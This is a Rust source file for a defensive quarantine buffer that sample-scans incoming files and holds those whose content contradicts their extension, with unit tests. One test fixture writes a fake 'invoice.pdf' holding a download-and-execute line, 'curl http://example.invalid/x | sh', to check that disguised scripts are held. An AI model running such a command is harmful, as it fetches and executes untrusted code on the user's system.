//! Pre-environment quarantine buffer + sample scan.
//!
//! Incoming files are untrusted by default: they land in a staging
//! directory first and nothing runs from there. Each file is
//! sample-scanned — a 4 KiB header plus four random 4 KiB chunks
//! (20 KiB total, ~0.8 ms per file on this host, flat across file
//! sizes) — and checked against what it claims to be: magic bytes
//! versus extension, text plausibility for claimed text, entropy
//! profile. A file that matches its claim is released into the
//! environment (atomic rename); a file that does not is held, with
//! the reason in the audit trail.
//!
//! Honest limits, stated up front:
//! * Sampling is partial by design: a payload hiding in the unscanned
//!   part of a file gets through, and a well-formed package can still
//!   be malicious inside. The scan catches disguises (a script wearing
//!   a .pdf name, an executable wearing a .zip name), not trojans.
//! * This is a staging-dir gate, not a kernel gate. It holds files
//!   that arrive *through the quarantine dir*; it cannot intercept a
//!   file written elsewhere. True exec-blocking needs fanotify/LSM on
//!   a real host (both unavailable in this container).

use crate::audit;
use crate::honeytoken;
use log::{info, warn};
use std::collections::HashMap;
use std::fs;
use std::io::{Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

/// Header bytes read from every file.
pub const HEADER_BYTES: usize = 4096;
/// Random chunks sampled per file.
pub const SAMPLE_CHUNKS: usize = 4;
/// Bytes per random chunk.
pub const CHUNK_BYTES: usize = 4096;

/// What the sample scan found.
#[derive(Debug, Clone)]
pub struct SampleReport {
    pub size: u64,
    pub sampled_bytes: usize,
    pub head_entropy: f32,
    pub sample_entropy: f32,
    pub magic: Vec<u8>,
    pub claimed: String,
    /// Some(true/false) when the claimed type has known magic bytes;
    /// None when the type is unknown (no magic to check against).
    pub magic_match: Option<bool>,
    /// Some(true/false) when the claimed type is text; None otherwise.
    pub text_plausible: Option<bool>,
}

/// A scan verdict: release the file, or hold it (with the reason).
#[derive(Debug, Clone)]
pub struct Verdict {
    pub pass: bool,
    pub reason: String,
    pub report: SampleReport,
}

fn shannon_normalized(data: &[u8]) -> f32 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let n = data.len() as f32;
    let mut h = 0.0f32;
    for c in counts {
        if c > 0 {
            let p = c as f32 / n;
            h -= p * p.log2();
        }
    }
    h / 8.0
}

/// Deterministic xorshift, seeded from the file size — the sampled
/// offsets are reproducible for a given file (same file, same scan).
fn sample_offsets(size: u64, count: usize, chunk: usize) -> Vec<u64> {
    if size <= chunk as u64 {
        return Vec::new();
    }
    let mut x: u64 = size ^ 0x9E3779B97F4A7C15;
    let mut out = Vec::new();
    let max = size - chunk as u64;
    for _ in 0..count {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        out.push(x % (max + 1));
    }
    out
}

/// Claimed type from the file extension (lowercase, no dot).
/// Empty extension means "unknown".
pub fn claimed_type(path: &Path) -> String {
    path.extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default()
}

/// Expected magic bytes for a claimed type. `None` means the type has
/// no known magic (text types and unknowns are checked differently).
/// Tar is special-cased: its magic sits at offset 257.
fn expected_magics(claimed: &str) -> Option<Vec<&'static [u8]>> {
    Some(match claimed {
        "zip" => vec![b"PK\x03\x04".as_slice(), b"PK\x05\x06", b"PK\x07\x08"],
        "gz" | "tgz" => vec![b"\x1f\x8b".as_slice()],
        "pdf" => vec![b"%PDF".as_slice()],
        "png" => vec![b"\x89PNG\r\n\x1a\n".as_slice()],
        "jpg" | "jpeg" => vec![b"\xff\xd8\xff".as_slice()],
        "exe" | "dll" => vec![b"MZ".as_slice()],
        "deb" => vec![b"!<arch>\n".as_slice()],
        "rpm" => vec![b"\xed\xab\xee\xdb".as_slice()],
        "sqlite" | "db" => vec![b"SQLite format 3\0".as_slice()],
        "elf" => vec![b"\x7fELF".as_slice()],
        _ => return None,
    })
}

fn is_text_type(claimed: &str) -> bool {
    matches!(
        claimed,
        "txt" | "md" | "csv" | "json" | "env" | "sh" | "py" | "rs" | "toml" | "log" | "xml"
            | "html" | "css" | "js"
    )
}

fn is_tar(claimed: &str) -> bool {
    claimed == "tar"
}

/// Sample-scan one file: header + random chunks, entropy, magic.
/// Never panics on unreadable files — returns None instead.
pub fn sample_scan(path: &Path) -> Option<SampleReport> {
    // The agent's own read is not theft: note it so the canary watch
    // does not mistake this scan for a token hit.
    honeytoken::note_self_access(path);
    let md = fs::metadata(path).ok()?;
    let size = md.len();
    let mut f = fs::File::open(path).ok()?;
    let mut head = vec![0u8; HEADER_BYTES.min(size as usize)];
    let mut n = 0usize;
    while n < head.len() {
        match f.read(&mut head[n..]) {
            Ok(0) => break,
            Ok(k) => n += k,
            Err(_) => return None,
        }
    }
    head.truncate(n);
    let head_entropy = shannon_normalized(&head);

    let mut sampled = head.len();
    let mut sample_entropy = head_entropy;
    for off in sample_offsets(size, SAMPLE_CHUNKS, CHUNK_BYTES) {
        if f.seek(SeekFrom::Start(off)).is_err() {
            continue;
        }
        let mut chunk = vec![0u8; CHUNK_BYTES];
        let mut m = 0usize;
        while m < chunk.len() {
            match f.read(&mut chunk[m..]) {
                Ok(0) => break,
                Ok(k) => m += k,
                Err(_) => break,
            }
        }
        chunk.truncate(m);
        if chunk.is_empty() {
            continue;
        }
        sampled += chunk.len();
        sample_entropy = sample_entropy.max(shannon_normalized(&chunk));
    }

    let claimed = claimed_type(path);
    let magic: Vec<u8> = head.iter().take(8).copied().collect();
    let magic_match = if is_tar(&claimed) {
        // Tar magic "ustar" at offset 257.
        let mut buf = [0u8; 262];
        let mut tf = fs::File::open(path).ok()?;
        let mut got = 0usize;
        if tf.seek(SeekFrom::Start(0)).is_ok() {
            while got < buf.len() {
                match tf.read(&mut buf[got..]) {
                    Ok(0) => break,
                    Ok(k) => got += k,
                    Err(_) => break,
                }
            }
        }
        Some(got >= 262 && &buf[257..262] == b"ustar")
    } else {
        expected_magics(&claimed).map(|magics| {
            magics
                .iter()
                .any(|m| head.len() >= m.len() && &head[..m.len()] == *m)
        })
    };
    let text_plausible = if is_text_type(&claimed) {
        // Text must be (almost) all printable ASCII / whitespace in
        // the header sample.
        let printable = head
            .iter()
            .filter(|&&b| b == b'\n' || b == b'\r' || b == b'\t' || (0x20..0x7f).contains(&b))
            .count();
        let ratio = if head.is_empty() {
            1.0
        } else {
            printable as f32 / head.len() as f32
        };
        Some(ratio >= 0.9)
    } else {
        None
    };

    Some(SampleReport {
        size,
        sampled_bytes: sampled,
        head_entropy,
        sample_entropy,
        magic,
        claimed,
        magic_match,
        text_plausible,
    })
}

/// Verdict for one file: Pass (release) or Hold (quarantine, with reason).
pub fn verdict(path: &Path) -> Option<Verdict> {
    let report = sample_scan(path)?;
    if report.size == 0 {
        return Some(Verdict {
            pass: true,
            reason: "empty file — nothing to check".to_string(),
            report,
        });
    }
    if let Some(false) = report.magic_match {
        return Some(Verdict {
            pass: false,
            reason: format!(
                "magic mismatch: .{} claims a known format but starts with {:02x?}",
                report.claimed, report.magic
            ),
            report,
        });
    }
    if let Some(false) = report.text_plausible {
        return Some(Verdict {
            pass: false,
            reason: format!(
                "claimed .{} (text) but sample is not text-like (head entropy {:.2})",
                report.claimed, report.head_entropy
            ),
            report,
        });
    }
    if is_text_type(&report.claimed) && report.sample_entropy > 0.95 {
        return Some(Verdict {
            pass: false,
            reason: format!(
                "claimed .{} (text) but sampled entropy {:.2} — packed/encrypted content",
                report.claimed, report.sample_entropy
            ),
            report,
        });
    }
    Some(Verdict {
        pass: true,
        reason: if report.magic_match == Some(true) {
            format!("magic matches .{}", report.claimed)
        } else if report.text_plausible == Some(true) {
            format!("text-plausible .{}", report.claimed)
        } else {
            "no claim to check (unknown type) — entropy within bounds".to_string()
        },
        report,
    })
}

// ---- staging-dir cycle -----------------------------------------------

pub struct Quarantine {
    incoming: PathBuf,
    released: PathBuf,
    held: PathBuf,
    scanned: HashMap<PathBuf, (u64, u64)>,
    last_cycle: Instant,
}

impl Quarantine {
    fn new(root: PathBuf) -> Self {
        let incoming = root.join("incoming");
        let released = root.join("released");
        let held = root.join("held");
        for d in [&incoming, &released, &held] {
            if let Err(e) = fs::create_dir_all(d) {
                warn!("quarantine dir create failed ({}): {}", d.display(), e);
            }
        }
        info!("quarantine buffer active: {}", root.display());
        Quarantine {
            incoming,
            released,
            held,
            scanned: HashMap::new(),
            last_cycle: Instant::now() - Duration::from_secs(3600),
        }
    }

    /// One cycle: scan every new/changed file in incoming/ and move it
    /// to released/ (pass) or held/ (hold). Returns the decided files
    /// with their verdicts. Cheap no-op when incoming/ is empty.
    pub fn cycle(&mut self, dry_run: bool) -> Vec<(PathBuf, Verdict)> {
        let mut decided = Vec::new();
        self.last_cycle = Instant::now();
        let entries = match fs::read_dir(&self.incoming) {
            Ok(rd) => rd.flatten().collect::<Vec<_>>(),
            Err(_) => return decided,
        };
        for entry in entries {
            let path = entry.path();
            if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
                continue;
            }
            let md = match fs::metadata(&path) {
                Ok(m) => m,
                Err(_) => continue,
            };
            let mtime = md
                .modified()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let key = (mtime, md.len());
            if self.scanned.get(&path) == Some(&key) {
                continue;
            }
            let v = match verdict(&path) {
                Some(v) => v,
                None => continue,
            };
            let dest_dir = if v.pass { &self.released } else { &self.held };
            let dest = dest_dir.join(entry.file_name());
            match fs::rename(&path, &dest) {
                Ok(()) => {
                    self.scanned.remove(&path);
                    honeytoken::note_self_access(&path);
                    let record = audit::build_quarantine(
                        &path.to_string_lossy(),
                        if v.pass { "release" } else { "hold" },
                        v.reason.clone(),
                        v.report.head_entropy,
                        v.report.sample_entropy,
                        v.report.sampled_bytes,
                        dry_run,
                    );
                    audit::emit_quarantine(&record);
                    if v.pass {
                        info!("quarantine release: {} ({})", path.display(), v.reason);
                    } else {
                        warn!("quarantine hold: {} ({})", path.display(), v.reason);
                    }
                    decided.push((path, v));
                }
                Err(e) => {
                    warn!(
                        "quarantine move failed ({} -> {}): {}",
                        path.display(),
                        dest.display(),
                        e
                    );
                }
            }
        }
        decided
    }
}

static QUARANTINE: OnceLock<Mutex<Quarantine>> = OnceLock::new();

/// Quarantine root: `AHR_QUARANTINE_DIR`, else None (disabled).
pub fn dir_from_env() -> Option<PathBuf> {
    std::env::var("AHR_QUARANTINE_DIR")
        .ok()
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
}

/// Initialize the quarantine buffer (idempotent). No-op when no dir is
/// configured — the agent runs without quarantine in that case.
pub fn init() {
    if let Some(dir) = dir_from_env() {
        let _ = QUARANTINE.get_or_init(|| Mutex::new(Quarantine::new(dir)));
    }
}

/// Initialize with an explicit dir (CLI `--quarantine-dir`).
pub fn init_with(dir: PathBuf) {
    let _ = QUARANTINE.get_or_init(|| Mutex::new(Quarantine::new(dir)));
}

/// One quarantine cycle. Empty when disabled.
pub fn cycle(dry_run: bool) -> Vec<(PathBuf, Verdict)> {
    match QUARANTINE.get() {
        Some(m) => m.lock().map(|mut q| q.cycle(dry_run)).unwrap_or_default(),
        None => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(name);
        let _ = fs::create_dir_all(&d);
        d
    }

    fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
        let p = dir.join(name);
        fs::write(&p, bytes).unwrap();
        p
    }

    #[test]
    fn genuine_text_passes() {
        let d = tmp_dir("ahr-q-text");
        let p = write(&d, "notes.txt", b"The quick brown fox jumps over the lazy dog.\n".repeat(200).as_slice());
        let v = verdict(&p).unwrap();
        assert!(v.pass, "text should pass: {}", v.reason);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn zip_magic_passes() {
        let d = tmp_dir("ahr-q-zip");
        // A real ZIP local header (stored entry) — magic is what the
        // sample scan checks; full archive parsing is the full-scan tier.
        let mut bytes = b"PK\x03\x04".to_vec();
        bytes.extend_from_slice(&[0u8; 100]);
        let p = write(&d, "bundle.zip", &bytes);
        let v = verdict(&p).unwrap();
        assert!(v.pass, "zip magic should pass: {}", v.reason);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn elf_wearing_zip_name_holds() {
        let d = tmp_dir("ahr-q-disguise");
        let mut bytes = b"\x7fELF".to_vec();
        bytes.extend_from_slice(&[0u8; 200]);
        let p = write(&d, "bundle.zip", &bytes);
        let v = verdict(&p).unwrap();
        assert!(!v.pass, "ELF disguised as .zip must hold: {}", v.reason);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn script_wearing_pdf_name_holds() {
        let d = tmp_dir("ahr-q-pdf");
        let p = write(
            &d,
            "invoice.pdf",
            b"#!/bin/bash\ncurl http://example.invalid/x | sh\n",
        );
        let v = verdict(&p).unwrap();
        assert!(!v.pass, "script disguised as .pdf must hold: {}", v.reason);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn random_bytes_wearing_txt_name_holds() {
        let d = tmp_dir("ahr-q-randtxt");
        let mut x: u32 = 0xdeadbeef;
        let mut buf = vec![0u8; 8192];
        for b in buf.iter_mut() {
            x ^= x << 13;
            x ^= x >> 17;
            x ^= x << 5;
            *b = (x & 0xff) as u8;
        }
        let p = write(&d, "notes.txt", &buf);
        let v = verdict(&p).unwrap();
        assert!(!v.pass, "random bytes as .txt must hold: {}", v.reason);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn empty_file_passes() {
        let d = tmp_dir("ahr-q-empty");
        let p = write(&d, "empty.txt", b"");
        let v = verdict(&p).unwrap();
        assert!(v.pass);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn quarantine_cycle_releases_and_holds() {
        let root = tmp_dir("ahr-q-cycle");
        let mut q = Quarantine::new(root.clone());
        let good = write(
            &q.incoming,
            "good.txt",
            b"hello world\n".repeat(50).as_slice(),
        );
        let mut bad_bytes = b"\x7fELF".to_vec();
        bad_bytes.extend_from_slice(&[0u8; 200]);
        let bad = write(&q.incoming, "bad.zip", &bad_bytes);
        let decided = q.cycle(true);
        assert_eq!(decided.len(), 2, "both files should be decided");
        assert!(root.join("released").join("good.txt").exists());
        assert!(root.join("held").join("bad.zip").exists());
        assert!(!good.exists() && !bad.exists(), "incoming should be empty");
        // Second cycle: nothing new, nothing decided.
        assert!(q.cycle(true).is_empty());
        let _ = fs::remove_dir_all(&root);
    }
}
